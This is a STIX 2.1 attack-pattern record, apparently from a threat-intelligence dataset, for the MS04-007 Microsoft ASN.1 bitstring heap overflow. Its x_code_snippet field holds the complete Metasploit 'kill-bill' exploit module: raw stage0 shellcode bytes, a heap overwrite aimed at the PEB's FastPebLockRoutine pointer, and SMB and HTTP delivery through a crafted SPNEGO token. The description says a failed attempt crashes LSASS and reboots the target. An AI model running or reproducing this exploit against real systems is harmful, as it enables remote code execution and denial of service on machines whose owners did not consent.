{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7fa05d59-664d-4e06-bc1d-4b6b7d4f58f5",
    "created": "2024-08-14T16:56:22.509605Z",
    "modified": "2024-08-14T16:56:22.509609Z",
    "name": "MS04-007 Microsoft ASN.1 Library Bitstring Heap Overflow",
    "description": " This is an exploit for a previously undisclosed vulnerability in the bit string decoding code in the Microsoft ASN.1 library. This vulnerability is not related to the bit string vulnerability described in eEye advisory AD20040210-2. Both vulnerabilities were fixed in the MS04-007 patch.  Windows 2000 SP4 Rollup 1 also patches this vulnerability.  You are only allowed one attempt with this vulnerability. If the payload fails to execute, the LSASS system service will crash and the target system will automatically reboot itself in 60 seconds. If the payload succeeds, the system will no longer be able to process authentication requests, denying all attempts to login through SMB or at the console. A reboot is required to restore proper functioning of an exploited system.  This exploit has been successfully tested with the win32/*/reverse_tcp payloads, however a few problems were encountered when using the equivalent bind payloads. Your mileage may vary.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/ms04_007_killbill.rb",
            "external_id": "ms04_007_killbill.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0818"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = LowRanking\n\n  include Msf::Exploit::Remote::SMB::Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS04-007 Microsoft ASN.1 Library Bitstring Heap Overflow',\n      'Description'    => %q{\n          This is an exploit for a previously undisclosed\n        vulnerability in the bit string decoding code in the\n        Microsoft ASN.1 library. This vulnerability is not related\n        to the bit string vulnerability described in eEye advisory\n        AD20040210-2. Both vulnerabilities were fixed in the\n        MS04-007 patch.  Windows 2000 SP4 Rollup 1 also patches this\n        vulnerability.\n\n        You are only allowed one attempt with this vulnerability. If\n        the payload fails to execute, the LSASS system service will\n        crash and the target system will automatically reboot itself\n        in 60 seconds. If the payload succeeds, the system will no\n        longer be able to process authentication requests, denying\n        all attempts to login through SMB or at the console. A\n        reboot is required to restore proper functioning of an\n        exploited system.\n\n        This exploit has been successfully tested with the win32/*/reverse_tcp\n        payloads, however a few problems were encountered when using the\n        equivalent bind payloads. Your mileage may vary.\n\n      },\n      'Author'         => [ 'Solar Eclipse <solareclipse[at]phreedom.org>' ],\n      'License'        => BSD_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2003-0818'],\n          [ 'OSVDB', '3902' ],\n          [ 'BID', '9633'],\n          [ 'MSB', 'MS04-007'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Windows 2000 SP2-SP4 + Windows XP SP0-SP1', # Tested OK - 11/25/2005 hdm (bind failed)\n            {\n              'Platform' => 'win',\n            },\n          ],\n        ],\n      'Notes'          =>\n        {\n          'AKA'         => [ 'kill-bill' ],\n          'Reliability' => [ UNRELIABLE_SESSION ],\n          'Stability'   => [ CRASH_OS_RESTARTS, CRASH_SERVICE_DOWN ]\n        },\n      'DisclosureDate' => '2004-02-10',\n      'DefaultTarget' => 0))\n\n    register_options [\n      OptEnum.new('PROTO', [true, 'Which protocol to use', 'smb', %w[smb http]]),\n    ]\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  # This exploit is too destructive to use during automated exploitation.\n  # Better Windows-based exploits exist at this time (Sep 2006)\n  def autofilter\n    false\n  end\n\n  # This is a straight port of Solar Eclipse's \"kill-bill\" exploit, published\n  # as a Metasploit Framework module with his permission. This module is only\n  # licensed under GPLv2, keep this in mind if you embed the Framework into\n  # a non-GPL application. -hdm[at]metasploit.com\n\n  def exploit\n\n    # The first stage shellcode fixes the PEB pointer and cleans the heap\n    stage0 =\n      \"\\x53\\x56\\x57\\x66\\x81\\xec\\x80\\x00\\x89\\xe6\\xe8\\xed\\x00\\x00\\x00\\xff\"+\n      \"\\x36\\x68\\x09\\x12\\xd6\\x63\\xe8\\xf7\\x00\\x00\\x00\\x89\\x46\\x08\\xe8\\xa2\"+\n      \"\\x00\\x00\\x00\\xff\\x76\\x04\\x68\\x6b\\xd0\\x2b\\xca\\xe8\\xe2\\x00\\x00\\x00\"+\n      \"\\x89\\x46\\x0c\\xe8\\x3f\\x00\\x00\\x00\\xff\\x76\\x04\\x68\\xfa\\x97\\x02\\x4c\"+\n      \"\\xe8\\xcd\\x00\\x00\\x00\\x31\\xdb\\x68\\x10\\x04\\x00\\x00\\x53\\xff\\xd0\\x89\"+\n      \"\\xc3\\x56\\x8b\\x76\\x10\\x89\\xc7\\xb9\\x10\\x04\\x00\\x00\\xf3\\xa4\\x5e\\x31\"+\n      \"\\xc0\\x50\\x50\\x50\\x53\\x50\\x50\\xff\\x56\\x0c\\x8b\\x46\\x08\\x66\\x81\\xc4\"+\n      \"\\x80\\x00\\x5f\\x5e\\x5b\\xff\\xe0\\x60\\xe8\\x23\\x00\\x00\\x00\\x8b\\x44\\x24\"+\n      \"\\x0c\\x8d\\x58\\x7c\\x83\\x43\\x3c\\x05\\x81\\x43\\x28\\x00\\x10\\x00\\x00\\x81\"+\n      \"\\x63\\x28\\x00\\xf0\\xff\\xff\\x8b\\x04\\x24\\x83\\xc4\\x14\\x50\\x31\\xc0\\xc3\"+\n      \"\\x31\\xd2\\x64\\xff\\x32\\x64\\x89\\x22\\x31\\xdb\\xb8\\x90\\x42\\x90\\x42\\x31\"+\n      \"\\xc9\\xb1\\x02\\x89\\xdf\\xf3\\xaf\\x74\\x03\\x43\\xeb\\xf3\\x89\\x7e\\x10\\x64\"+\n      \"\\x8f\\x02\\x58\\x61\\xc3\\x60\\xbf\\x20\\xf0\\xfd\\x7f\\x8b\\x1f\\x8b\\x46\\x08\"+\n      \"\\x89\\x07\\x8b\\x7f\\xf8\\x81\\xc7\\x78\\x01\\x00\\x00\\x89\\xf9\\x39\\x19\\x74\"+\n      \"\\x04\\x8b\\x09\\xeb\\xf8\\x89\\xfa\\x39\\x5a\\x04\\x74\\x05\\x8b\\x52\\x04\\xeb\"+\n      \"\\xf6\\x89\\x11\\x89\\x4a\\x04\\xc6\\x43\\xfd\\x01\\x61\\xc3\\xa1\\x0c\\xf0\\xfd\"+\n      \"\\x7f\\x8b\\x40\\x1c\\x8b\\x58\\x08\\x89\\x1e\\x8b\\x00\\x8b\\x40\\x08\\x89\\x46\"+\n      \"\\x04\\xc3\\x60\\x8b\\x6c\\x24\\x28\\x8b\\x45\\x3c\\x8b\\x54\\x05\\x78\\x01\\xea\"+\n      \"\\x8b\\x4a\\x18\\x8b\\x5a\\x20\\x01\\xeb\\xe3\\x38\\x49\\x8b\\x34\\x8b\\x01\\xee\"+\n      \"\\x31\\xff\\x31\\xc0\\xfc\\xac\\x38\\xe0\\x74\\x07\\xc1\\xcf\\x0d\\x01\\xc7\\xeb\"+\n      \"\\xf4\\x3b\\x7c\\x24\\x24\\x75\\xe1\\x8b\\x5a\\x24\\x01\\xeb\\x66\\x8b\\x0c\\x4b\"+\n      \"\\x8b\\x5a\\x1c\\x01\\xeb\\x8b\\x04\\x8b\\x01\\xe8\\x89\\x44\\x24\\x1c\\x61\\xc2\"+\n      \"\\x08\\x00\\xeb\\xfe\"\n\n    token = spnego_token(stage0, payload.encoded)\n\n    case datastore['PROTO']\n      when 'smb'\n        exploit_smb(token)\n      when 'http'\n        exploit_http(token)\n      else\n        print_status(\"Invalid application protocol specified, use smb or http\")\n    end\n  end\n\n\n  def exploit_smb(token)\n    connect(versions: [1])\n\n    client = Rex::Proto::SMB::Client.new(sock)\n\n    begin\n      client.session_request(smb_hostname()) if not datastore['SMBDirect']\n      client.negotiate\n      client.session_setup_with_ntlmssp_blob(token)\n    rescue => e\n      if (e.to_s =~ /error code 0x00050001/)\n        print_error(\"The target system has already been exploited\")\n      else\n        print_error(\"Error: #{e}\")\n      end\n    end\n\n    handler\n    disconnect\n  end\n\n  def exploit_http(token)\n    connect(versions: [1])\n\n    req = \"GET / HTTP/1.0\\r\\n\"\n    req << \"Host: #{ datastore['RHOST']}\\r\\n\"\n    req << \"Authorization: Negotiate #{Rex::Text.encode_base64(token, '')}\\r\\n\\r\\n\"\n\n    sock.put(req)\n    res = sock.get_once\n\n    if (res and res =~ /0x80090301/)\n      print_error(\"This server does not support the Negotiate protocol or has already been exploited\")\n    end\n\n    if (res and res =~ /0x80090304/)\n      print_error(\"This server responded with error code 0x80090304 (wth?)\")\n    end\n\n    handler\n    disconnect\n  end\n\n\n  # Returns an ASN.1 encoded string\n  def enc_asn1(str)\n    Rex::Proto::NTLM::Utils::asn1encode(str)\n  end\n\n  # Returns an ASN.1 encoded bit string with 0 unused bits\n  def enc_bits(str)\n    \"\\x03\" + enc_asn1(\"\\x00\" + str)\n  end\n\n  # Returns a BER encoded constructed bit string\n  def enc_constr(*str_arr)\n    \"\\x23\" + enc_asn1(str_arr.join(''))\n  end\n\n  # Returns a BER encoded SPNEGO token\n  def spnego_token(stage0, stage1)\n\n    if !(stage0 and stage1)\n      print_status(\"Invalid parameters passed to spnego_token\")\n      return\n    end\n\n    if (stage0.length > 1032)\n      print_status(\"The stage 0 shellcode is longer than 1032 bytes\")\n      return\n    end\n\n    tag = \"\\x90\\x42\\x90\\x42\\x90\\x42\\x90\\x42\"\n\n    if ((tag.length + stage1.length) > 1033)\n      print_status(\"The stage 1 shellcode is too long\")\n      return\n    end\n\n\n    # The first two overwrites must succeed, so we write to an unused location\n    # in the PEB block. We don't care about the values, because after this the\n    # doubly linked list of free blocks is corrupted and we get to the second\n    # overwrite which is more useful.\n\n    fw = \"\\xf8\\x0f\\x01\\x00\"\t\t# 0x00010ff8\n    bk = \"\\xf8\\x0f\\x01\"\n\n    # The second overwrite writes the address of our shellcode into the\n    # FastPebLockRoutine pointer in the PEB\n\n    peblock = \"\\x20\\xf0\\xfd\\x7f\" # FastPebLockRoutine in PEB\n\n    bitstring = enc_constr(\n      enc_bits(\"A\" * 1024),\n      \"\\x03\\x00\",\n      enc_constr(\n        enc_bits(tag + stage1 + (\"B\" * (1033-(tag+stage1).length))),\n        enc_constr( enc_bits(fw + bk) ),\n        enc_constr(\n          enc_bits(\"CCCC\" + peblock + stage0 + (\"C\" * (1032-stage0.length))),\n          enc_constr(\n            enc_bits(\"\\xeb\\x06\" + make_nops(6)),\n            enc_bits(\"D\" * 1040)\n          )\n        )\n      )\n    )\n\n    token = \"\\x60\" + enc_asn1(                 # Application Constructed Object\n      \"\\x06\\x06\\x2b\\x06\\x01\\x05\\x05\\x02\" +   # SPNEGO OID\n      \"\\xa0\" + enc_asn1(\t\t\t\t\t   # NegTokenInit (0xa0)\n        \"\\x30\" + enc_asn1(\n          \"\\xa1\" + enc_asn1(\n            bitstring\n          )\n        )\n      )\n    )\n\n    return token\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-02-10",
    "x_mitre_platforms": [
        "win'"
    ]
}